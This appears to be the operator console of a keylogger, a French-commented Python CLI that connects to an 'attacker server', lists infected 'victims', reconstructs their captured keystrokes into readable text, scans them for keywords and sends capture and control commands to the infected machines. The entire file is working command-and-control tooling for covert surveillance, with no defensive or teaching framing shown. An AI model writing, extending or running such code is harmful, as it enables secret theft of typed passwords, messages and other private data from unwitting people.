"""
Contrôleur - Interface CLI pour gérer les victimes
"""

import requests
import json
from datetime import datetime
from colorama import init, Fore, Style

import config

# Initialiser colorama pour Windows
init(autoreset=True)


class Controller:
    def __init__(self):
        self.base_url = config.BASE_URL
        self.victims = {}
    
    def print_header(self):
        """
        Affiche l'en-tête du contrôleur
        """
        print("\n" + "=" * 60)
        print(Fore.CYAN + "  CONTRÔLEUR KEYLOGGER - Interface de Gestion")
        print("=" * 60 + Style.RESET_ALL)
    
    def print_error(self, message):
        """
        Affiche un message d'erreur
        """
        print(Fore.RED + f"[-] {message}" + Style.RESET_ALL)
    
    def print_success(self, message):
        """
        Affiche un message de succès
        """
        print(Fore.GREEN + f"[+] {message}" + Style.RESET_ALL)
    
    def print_info(self, message):
        """
        Affiche un message d'information
        """
        print(Fore.YELLOW + f"[!] {message}" + Style.RESET_ALL)
    
    def test_connection(self):
        """
        Teste la connexion au serveur attaquant
        """
        try:
            response = requests.get(f"{self.base_url}/victims", timeout=5)
            return response.status_code == 200
        except Exception as e:
            self.print_error(f"Impossible de se connecter au serveur: {e}")
            return False
    
    def list_victims(self):
        """
        Liste toutes les victimes actives
        """
        try:
            response = requests.get(f"{self.base_url}/victims", timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                victims = data.get('victims', [])
                
                if not victims:
                    self.print_info("Aucune victime enregistrée")
                    return []
                
                print("\n" + Fore.CYAN + "Victimes actives:" + Style.RESET_ALL)
                print("-" * 60)
                
                for i, victim in enumerate(victims, 1):
                    status = Fore.GREEN + "ACTIVE" if victim.get('active') else Fore.RED + "INACTIVE"
                    print(f"{i}. {Fore.YELLOW}ID: {victim['victim_id']}{Style.RESET_ALL}")
                    print(f"   Statut: {status}{Style.RESET_ALL}")
                    print(f"   Dernière activité: {victim.get('last_seen', 'Inconnue')}")
                    print()
                
                self.victims = {i: v['victim_id'] for i, v in enumerate(victims, 1)}
                return victims
            else:
                self.print_error(f"Erreur HTTP: {response.status_code}")
                return []
        
        except Exception as e:
            self.print_error(f"Erreur lors de la récupération: {e}")
            return []
    
    def show_logs(self, victim_id, limit=50):
        """
        Affiche les logs d'une victime
        """
        try:
            response = requests.get(
                f"{self.base_url}/victims/{victim_id}/logs",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                logs = data.get('logs', [])
                count = data.get('count', 0)
                
                print(f"\n{Fore.CYAN}Logs pour {victim_id}:{Style.RESET_ALL}")
                print(f"Total: {count} entrées")
                print("-" * 60)
                
                # Afficher les derniers logs
                recent_logs = logs[-limit:] if len(logs) > limit else logs
                
                text_buffer = ""
                for log in recent_logs:
                    timestamp = log.get('timestamp', 'N/A')
                    key = log.get('key', '')
                    
                    # Construire le texte
                    if key == '\n':
                        print(f"{Fore.GREEN}{text_buffer}{Style.RESET_ALL}")
                        text_buffer = ""
                    elif key == '[BACKSPACE]':
                        text_buffer = text_buffer[:-1] if text_buffer else ""
                    elif key == ' ':
                        text_buffer += ' '
                    elif len(key) == 1:
                        text_buffer += key
                    else:
                        if text_buffer:
                            print(f"{Fore.GREEN}{text_buffer}{Style.RESET_ALL}")
                            text_buffer = ""
                        print(f"{Fore.YELLOW}[{key}]{Style.RESET_ALL}")
                
                if text_buffer:
                    print(f"{Fore.GREEN}{text_buffer}{Style.RESET_ALL}")
                
                print("-" * 60)
            
            else:
                self.print_error(f"Erreur HTTP: {response.status_code}")
        
        except Exception as e:
            self.print_error(f"Erreur lors de la récupération des logs: {e}")
    
    def analyze_victim(self, victim_id):
        """
        Analyse les logs d'une victime
        """
        try:
            response = requests.get(
                f"{self.base_url}/victims/{victim_id}/analyze",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                analysis = data.get('analysis', {})
                
                print(f"\n{Fore.CYAN}Analyse pour {victim_id}:{Style.RESET_ALL}")
                print("-" * 60)
                print(f"Total de touches: {analysis.get('total_keys', 0)}")
                
                keywords = analysis.get('keywords', [])
                if keywords:
                    print(f"\n{Fore.YELLOW}Mots-clés détectés:{Style.RESET_ALL}")
                    for keyword in keywords[:10]:
                        print(f"  - {keyword}")
                
                sequences = analysis.get('repetitive_sequences', [])
                if sequences:
                    print(f"\n{Fore.YELLOW}Séquences répétitives:{Style.RESET_ALL}")
                    for seq in sequences[:5]:
                        print(f"  - '{seq['key']}' répété {seq['count']} fois")
                
                print("-" * 60)
            
            else:
                self.print_error(f"Erreur HTTP: {response.status_code}")
        
        except Exception as e:
            self.print_error(f"Erreur lors de l'analyse: {e}")
    
    def send_command(self, victim_id, command, params=None):
        """
        Envoie une commande à une victime
        Note: Cette fonctionnalité nécessite une implémentation côté victime
        pour recevoir et exécuter les commandes
        """
        try:
            payload = {
                "victim_id": victim_id,
                "command": command,
                "params": params or {}
            }
            
            response = requests.post(
                f"{self.base_url}/command",
                json=payload,
                timeout=5
            )
            
            if response.status_code == 200:
                self.print_success(f"Commande '{command}' envoyée à {victim_id}")
            else:
                self.print_error(f"Erreur HTTP: {response.status_code}")
        
        except Exception as e:
            self.print_error(f"Erreur lors de l'envoi de la commande: {e}")
    
    def print_menu(self):
        """
        Affiche le menu principal
        """
        print("\n" + Fore.CYAN + "Commandes disponibles:" + Style.RESET_ALL)
        print("  " + Fore.YELLOW + "list" + Style.RESET_ALL + "              - Lister les victimes actives")
        print("  " + Fore.YELLOW + "logs <id>" + Style.RESET_ALL + "         - Afficher les logs d'une victime")
        print("  " + Fore.YELLOW + "analyze <id>" + Style.RESET_ALL + "      - Analyser les logs d'une victime")
        print("  " + Fore.YELLOW + "command <id> <cmd>" + Style.RESET_ALL + " - Envoyer une commande")
        print("  " + Fore.YELLOW + "help" + Style.RESET_ALL + "              - Afficher ce menu")
        print("  " + Fore.YELLOW + "exit" + Style.RESET_ALL + "              - Quitter")
        print()
    
    def run(self):
        """
        Boucle principale du contrôleur
        """
        self.print_header()
        
        # Tester la connexion
        if not self.test_connection():
            self.print_error("Impossible de se connecter au serveur attaquant")
            self.print_info(f"Vérifiez que le serveur est démarré sur {config.ATTACKER_IP}:{config.ATTACKER_PORT}")
            return
        
        self.print_success("Connexion au serveur établie")
        
        self.print_menu()
        
        while True:
            try:
                command = input(Fore.CYAN + "controleur> " + Style.RESET_ALL).strip().split()
                
                if not command:
                    continue
                
                cmd = command[0].lower()
                
                if cmd == "exit":
                    print(Fore.YELLOW + "\n[!] Arrêt du contrôleur..." + Style.RESET_ALL)
                    break
                
                elif cmd == "help":
                    self.print_menu()
                
                elif cmd == "list":
                    self.list_victims()
                
                elif cmd == "logs":
                    if len(command) < 2:
                        self.print_error("Usage: logs <victim_id>")
                        continue
                    
                    victim_id = command[1]
                    limit = int(command[2]) if len(command) > 2 else 50
                    self.show_logs(victim_id, limit)
                
                elif cmd == "analyze":
                    if len(command) < 2:
                        self.print_error("Usage: analyze <victim_id>")
                        continue
                    
                    victim_id = command[1]
                    self.analyze_victim(victim_id)
                
                elif cmd == "command":
                    if len(command) < 3:
                        self.print_error("Usage: command <victim_id> <command_name>")
                        self.print_info("Commandes disponibles: start_capture, stop_capture, switch_mode, flush_logs")
                        continue
                    
                    victim_id = command[1]
                    command_name = command[2]
                    params = command[3:] if len(command) > 3 else []
                    
                    self.send_command(victim_id, command_name, params)
                
                else:
                    self.print_error(f"Commande inconnue: {cmd}")
                    self.print_info("Tapez 'help' pour voir les commandes disponibles")
            
            except KeyboardInterrupt:
                print(Fore.YELLOW + "\n[!] Arrêt du contrôleur..." + Style.RESET_ALL)
                break
            except Exception as e:
                self.print_error(f"Erreur: {e}")


if __name__ == "__main__":
    controller = Controller()
    controller.run()

